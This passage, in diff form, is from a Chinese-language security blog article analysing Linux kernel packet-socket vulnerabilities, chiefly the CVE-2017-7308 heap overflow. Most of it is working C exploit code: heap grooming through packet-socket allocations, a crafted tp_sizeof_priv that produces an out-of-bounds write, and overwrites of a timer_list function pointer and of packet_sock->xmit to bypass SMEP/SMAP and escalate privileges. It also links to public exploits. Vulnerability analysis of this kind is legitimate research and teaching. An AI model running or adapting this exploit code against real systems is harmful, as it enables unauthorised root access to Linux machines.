+    <span class="n">memset</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">p1</span><span class="p">));</span>
+<span class="p">......</span>
+    <span class="n">p1</span><span class="o">-&gt;</span><span class="n">blk_sizeof_priv</span> <span class="o">=</span> <span class="n">req_u</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_sizeof_priv</span><span class="p">;</span>
+
+    <span class="n">p1</span><span class="o">-&gt;</span><span class="n">max_frame_len</span> <span class="o">=</span> <span class="n">p1</span><span class="o">-&gt;</span><span class="n">kblk_size</span> <span class="o">-</span> <span class="n">BLK_PLUS_PRIV</span><span class="p">(</span><span class="n">p1</span><span class="o">-&gt;</span><span class="n">blk_sizeof_priv</span><span class="p">);</span>
+<span class="p">......</span>
+<span class="p">}</span>
+</pre></div>
+<p>当某个帧被拷贝到内存块中时就可以绕过对它的大小检测，最终导致内核堆越界写入。</p>
+<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">tpacket_rcv</span><span class="p">(</span><span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">net_device</span> <span class="o">*</span><span class="n">dev</span><span class="p">,</span>
+               <span class="k">struct</span> <span class="n">packet_type</span> <span class="o">*</span><span class="n">pt</span><span class="p">,</span> <span class="k">struct</span> <span class="n">net_device</span> <span class="o">*</span><span class="n">orig_dev</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="p">......</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">macoff</span> <span class="o">+</span> <span class="n">snaplen</span> <span class="o">&gt;</span>
+                <span class="n">GET_PBDQC_FROM_RB</span><span class="p">(</span><span class="o">&amp;</span><span class="n">po</span><span class="o">-&gt;</span><span class="n">rx_ring</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">max_frame_len</span><span class="p">))</span> <span class="p">{</span>
+<span class="p">......</span>
+    <span class="n">skb_copy_bits</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">h</span><span class="p">.</span><span class="n">raw</span> <span class="o">+</span> <span class="n">macoff</span><span class="p">,</span> <span class="n">snaplen</span><span class="p">);</span>
+<span class="p">......</span>
+<span class="p">}</span>
+</pre></div>
+<p>prb_open_block函数用来初始化一个内存块。当内核收到新的数据包时，数据包的写入地址存放在pkc1-&gt;nxt_offset中。内核不想覆盖内存块头部以及内存块对应的私有数据，因此它会将这个地址指向紧挨着头部和私有数据之后的那个地址。由于我们可以控制pkc1-&gt;blk_sizeof_priv，因此也可以控制pkc1-&gt;nxt_offset的最低的两个字节。这样我们就能够控制越界写入的偏移量。</p>
+<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">prb_open_block</span><span class="p">(</span><span class="k">struct</span> <span class="n">tpacket_kbdq_core</span> <span class="o">*</span><span class="n">pkc1</span><span class="p">,</span>
+    <span class="k">struct</span> <span class="n">tpacket_block_desc</span> <span class="o">*</span><span class="n">pbd1</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="p">......</span>
+    <span class="n">pkc1</span><span class="o">-&gt;</span><span class="n">nxt_offset</span> <span class="o">=</span> <span class="n">pkc1</span><span class="o">-&gt;</span><span class="n">pkblk_start</span> <span class="o">+</span> <span class="n">BLK_PLUS_PRIV</span><span class="p">(</span><span class="n">pkc1</span><span class="o">-&gt;</span><span class="n">blk_sizeof_priv</span><span class="p">);</span>
+<span class="p">......</span>
+<span class="p">}</span>
+</pre></div>
+<p>漏洞的利用方法是利用堆越界写入覆盖内存中与溢出内存块临近的那个函数指针。因此需要对堆进行精确布局，使得某些带有可触发函数指针的对象被精确放置在某个环形缓冲区之后。这里使用packet_sock结构体作为这类对象。我们需要找到一种办法，使得内核将一个环形缓冲区内存块和一个packet_sock结构体分配在一起。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181127112909-99de99ae-f1f4-1.jpg"/><br/>
+环形缓冲区内存块通过buddy分配器进行分配，它可以为内存块分配2^n个连续的内存页面。对于每个n值，分配器会为这类内存块维护一个freelist表，并在请求内存块时返回freelist表头。如果某个n值对应的freelist为空，分配器就会查找第一个满足m&gt;n且其freelist不为空的值，然后将它分为两半，直到所需的大小得到满足。因此，如果我们一直以2^n大小重复分配内存块，那么在某些时候，这些内存块会由某个高位内存块分裂所得，且这些内存块会彼此相邻。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181128142131-d92748ea-f2d5-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181128142138-dd4e67e6-f2d5-1.png"/><br/>
+packet_sock结构体是通过slab分配器使用kmalloc函数进行分配的。slab分配器主要用于分配比单内存页还小的那些对象。它使用buddy分配器分配一大块内存，然后切割这块内存，生成较小的对象。大的内存块称之为slabs，这也就是slab分配器的名称来源。一组slabs与它们的当前状态以及一组操作(分配对象/释放对象)一起，统称为一个缓存。slab分配器会按照2^n大小，为对象创建一组通用的缓存。每当kmalloc函数被调用时，slab分配器会将size调整到与2的幂最为接近的一个值，使用这个size作为缓存的大小。由于内核一直使用的都是kmalloc函数，如果我们试图分配一个对象，那么这个对象很有可能会来自于之前已经创建的一个slab中。然而，如果我们一直分配同样大小的对象，那么在某些时候，slab分配器将会将同样大小的slab全部用光，然后不得不使用buddy分配器分配另一个slab。新创建的slab的大小取决于这个slab所用的对象大小。packet_sock结构体的大小大约为1920，而1024 &lt; 1920 &lt;= 2048，这意味着对象的大小会调整到2048，并且会使用kmalloc-2048缓存。对于这个特定的缓存，SLUB分配器(这个分配器是Ubuntu所使用的slab分配器)会使用大小为0x8000的slabs。因此每当分配器用光kmalloc-2048缓存的slab时，它就会使用buddy分配器分配0x8000字节的空间。<br/>
+漏洞利用过程如下：<br/>
+1.分配许多大小为2048的对象(这里是512个)，填充当前kmalloc-2048缓存中存在的slabs。</p>
+<div class="highlight"><pre><span></span><span class="cp">#define KMALLOC_PAD         512</span>
+
+<span class="n">kmalloc_pad</span><span class="p">(</span><span class="n">KMALLOC_PAD</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">kmalloc_pad</span><span class="p">(</span><span class="kt">int</span> <span class="n">count</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">packet_sock_kmalloc</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">packet_sock_kmalloc</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_PACKET</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="n">htons</span><span class="p">(</span><span class="n">ETH_P_ARP</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">dprintf</span><span class="p">(</span><span class="s">"[-] socket(SOCK_DGRAM)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>2.分配许多大小为0x8000的页面内存块(这里是1024个)，耗尽buddy分配器的freelists，使得某些高位页面内存块被拆分。</p>
+<div class="highlight"><pre><span></span><span class="cp">#define PAGEALLOC_PAD           1024</span>
+
+<span class="n">pagealloc_pad</span><span class="p">(</span><span class="n">PAGEALLOC_PAD</span><span class="p">);</span>
+
+<span class="kt">void</span> <span class="nf">pagealloc_pad</span><span class="p">(</span><span class="kt">int</span> <span class="n">count</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">packet_socket_setup</span><span class="p">(</span><span class="mh">0x8000</span><span class="p">,</span> <span class="mi">2048</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">packet_socket_setup</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">block_size</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">frame_size</span><span class="p">,</span>
+        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">block_nr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sizeof_priv</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_PACKET</span><span class="p">,</span> <span class="n">SOCK_RAW</span><span class="p">,</span> <span class="n">htons</span><span class="p">(</span><span class="n">ETH_P_ALL</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">s</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">dprintf</span><span class="p">(</span><span class="s">"[-] socket(AF_PACKET)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">packet_socket_rx_ring_init</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">block_size</span><span class="p">,</span> <span class="n">frame_size</span><span class="p">,</span> <span class="n">block_nr</span><span class="p">,</span>
+        <span class="n">sizeof_priv</span><span class="p">,</span> <span class="n">timeout</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">sockaddr_ll</span> <span class="n">sa</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
+    <span class="n">sa</span><span class="p">.</span><span class="n">sll_family</span> <span class="o">=</span> <span class="n">PF_PACKET</span><span class="p">;</span>
+    <span class="n">sa</span><span class="p">.</span><span class="n">sll_protocol</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">ETH_P_ALL</span><span class="p">);</span>
+    <span class="n">sa</span><span class="p">.</span><span class="n">sll_ifindex</span> <span class="o">=</span> <span class="n">if_nametoindex</span><span class="p">(</span><span class="s">"lo"</span><span class="p">);</span>
+    <span class="n">sa</span><span class="p">.</span><span class="n">sll_hatype</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">sa</span><span class="p">.</span><span class="n">sll_pkttype</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">sa</span><span class="p">.</span><span class="n">sll_halen</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="kt">int</span> <span class="n">rv</span> <span class="o">=</span> <span class="n">bind</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">rv</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">dprintf</span><span class="p">(</span><span class="s">"[-] bind(AF_PACKET)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">packet_socket_rx_ring_init</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">block_size</span><span class="p">,</span>
+        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">frame_size</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">block_nr</span><span class="p">,</span>
+        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sizeof_priv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">v</span> <span class="o">=</span> <span class="n">TPACKET_V3</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">rv</span> <span class="o">=</span> <span class="n">setsockopt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SOL_PACKET</span><span class="p">,</span> <span class="n">PACKET_VERSION</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">rv</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">dprintf</span><span class="p">(</span><span class="s">"[-] setsockopt(PACKET_VERSION)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">struct</span> <span class="n">tpacket_req3</span> <span class="n">req</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">tp_block_size</span> <span class="o">=</span> <span class="n">block_size</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">tp_frame_size</span> <span class="o">=</span> <span class="n">frame_size</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">tp_block_nr</span> <span class="o">=</span> <span class="n">block_nr</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">tp_frame_nr</span> <span class="o">=</span> <span class="p">(</span><span class="n">block_size</span> <span class="o">*</span> <span class="n">block_nr</span><span class="p">)</span> <span class="o">/</span> <span class="n">frame_size</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">tp_retire_blk_tov</span> <span class="o">=</span> <span class="n">timeout</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">tp_sizeof_priv</span> <span class="o">=</span> <span class="n">sizeof_priv</span><span class="p">;</span>
+    <span class="n">req</span><span class="p">.</span><span class="n">tp_feature_req_word</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="n">rv</span> <span class="o">=</span> <span class="n">setsockopt</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">SOL_PACKET</span><span class="p">,</span> <span class="n">PACKET_RX_RING</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">));</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">rv</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">dprintf</span><span class="p">(</span><span class="s">"[-] setsockopt(PACKET_RX_RING)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>3.创建一个socket，附加一个环形缓冲区，有两块大小为0x8000的内存块。第二个内存块是需要溢出的那个内存块。如果将nxt_offset指向内存块的尾部，那么当第一个数据包正在接收时，第一个内存块会马上被关闭，因为内核会认为第一个内存块中没有任何空余的空间。所以创建一个具备两个内存块的环形缓冲区，第一个内存块会被关闭，第二个内存块会被覆盖。</p>
+<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">oob_setup</span><span class="p">(</span><span class="kt">int</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">maclen</span> <span class="o">=</span> <span class="n">ETH_HDR_LEN</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">netoff</span> <span class="o">=</span> <span class="n">TPACKET_ALIGN</span><span class="p">(</span><span class="n">TPACKET3_HDRLEN</span> <span class="o">+</span>
+                <span class="p">(</span><span class="n">maclen</span> <span class="o">&lt;</span> <span class="mi">16</span> <span class="o">?</span> <span class="mi">16</span> <span class="o">:</span> <span class="n">maclen</span><span class="p">));</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">macoff</span> <span class="o">=</span> <span class="n">netoff</span> <span class="o">-</span> <span class="n">maclen</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sizeof_priv</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1u</span><span class="o">&lt;&lt;</span><span class="mi">31</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1u</span><span class="o">&lt;&lt;</span><span class="mi">30</span><span class="p">)</span> <span class="o">+</span>
+        <span class="mh">0x8000</span> <span class="o">-</span> <span class="n">BLK_HDR_LEN</span> <span class="o">-</span> <span class="n">macoff</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span>
+    <span class="k">return</span> <span class="n">packet_socket_setup</span><span class="p">(</span><span class="mh">0x8000</span><span class="p">,</span> <span class="mi">2048</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">sizeof_priv</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+</pre></div>
+<p>4.创建一些socket分配packet_sock结构体，最终导致至少有一个新的slab被分配。<strong>这个时候我们就把由buddy分配器分配的环形缓冲区和由slab分配器分配的packet_sock结构体放在了一起。</strong>由于当前正在存放到环形缓冲区中的数据为正在通过特定网络接口的数据包，可以通过回环接口使用原始套接字手动发送具有任意内容的数据包。如果在一个隔离的网络命名空间中执行这个操作就不会受到外部网络流量干扰。仍然使用前面覆盖timer_list结构体的方法绕过SMEP&amp;SMAP。</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">oob_timer_execute</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">func</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">oob_setup</span><span class="p">(</span><span class="mi">2048</span> <span class="o">+</span> <span class="n">TIMER_OFFSET</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span><span class="c1">//B78</span>
+
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">int</span> <span class="n">timer</span> <span class="o">=</span> <span class="n">packet_sock_kmalloc</span><span class="p">();</span>
+        <span class="n">packet_sock_timer_schedule</span><span class="p">(</span><span class="n">timer</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+
+    <span class="k">struct</span> <span class="n">timer_list</span> <span class="o">*</span><span class="n">timer</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">timer_list</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+    <span class="n">timer</span><span class="o">-&gt;</span><span class="n">function</span> <span class="o">=</span> <span class="n">func</span><span class="p">;</span>
+    <span class="n">timer</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">arg</span><span class="p">;</span>
+    <span class="n">timer</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+    <span class="n">oob_write</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">timer</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
+
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181128102707-1a4b5954-f2b5-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181127185455-dfb378bc-f232-1.png"/><br/>
+这里不知道大家注意到没有，rdx减去pkblk_end是0xb7a，而在EXP中设置的2048+TIMER_OFFSET-8=0xb78，因为对齐所以差了两个字节，后面oob_write把这两个字节补回来了。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181127185512-e9e86216-f232-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181127203918-74e97e28-f241-1.jpg"/><br/>
+5.再次利用漏洞覆盖packet_sock-&gt;xmit函数，使之去执行被替换后的用户态中的提权函数。</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">oob_id_match_execute</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">func</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="n">oob_setup</span><span class="p">(</span><span class="mi">2048</span> <span class="o">+</span> <span class="n">XMIT_OFFSET</span> <span class="o">-</span> <span class="mi">64</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="n">ps</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+
+    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">ps</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">packet_sock_kmalloc</span><span class="p">();</span>
+
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span>
+
+    <span class="kt">void</span> <span class="o">**</span><span class="n">xmit</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+    <span class="o">*</span><span class="n">xmit</span> <span class="o">=</span> <span class="n">func</span><span class="p">;</span>
+
+    <span class="n">oob_write</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">xmit</span><span class="p">)</span> <span class="o">+</span> <span class="mi">64</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">packet_sock_id_match_trigger</span><span class="p">(</span><span class="n">ps</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">packet_sock_id_match_trigger</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+    <span class="n">packet_socket_send</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+<span class="p">}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181128102631-04da9c38-f2b5-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181127185634-1b12f086-f233-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181127185642-20103cce-f233-1.png"/></p>
+<h2 data-content="1" id="ac4484a1c36e7b2b7b63fb7839ec3b62">总结</h2>
+<p>本文我们分析了linux内核关于网络协议中的三个漏洞，它们使用了覆盖packet_sock结构体中的timer_list结构体中的函数实现提权的方法。有别于可能更常见的stack pivot之后通过ROP链禁用SMEP的方法，这种方法能同时禁用SMEP和SMAP，也具有更好的稳定性。参考资料中给出了这几个漏洞用到的EXP和相关文章的链接。作者水平有限，如有不当还请指正。</p>
+<h2 data-content="1" id="637ba354373031fcf8e35cd94fb27308">参考资料</h2>
+<p>1.<a href="https://www.exploit-db.com/exploits/40871" target="_blank" title="CVE-2016-8655 EXP">CVE-2016-8655 EXP</a><br/>
+2.<a href="https://www.exploit-db.com/exploits/41458" target="_blank" title="CVE-2017-6074 EXP">CVE-2017-6074 EXP</a><br/>
+3.<a href="https://github.com/bcoles/kernel-exploits/blob/master/CVE-2017-7308/poc.c" target="_blank" title="CVE-2017-7308">CVE-2017-7308 EXP</a><br/>
+4.<a href="https://www.anquanke.com/post/id/85162" target="_blank" title="CVE-2016-8655内核竞争条件漏洞调试分析">CVE-2016-8655内核竞争条件漏洞调试分析</a><br/>
+5.<a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html" target="_blank" title="Exploiting the Linux kernel via packet sockets">Exploiting the Linux kernel via packet sockets</a><br/>
+6.<a href="http://powerofcommunity.net/poc2016/x82.pdf" target="_blank" title="New Reliable Android Kernel Root Exploitation Techniques">New Reliable Android Kernel Root Exploitation Techniques</a></p>
+</div>
+</div>
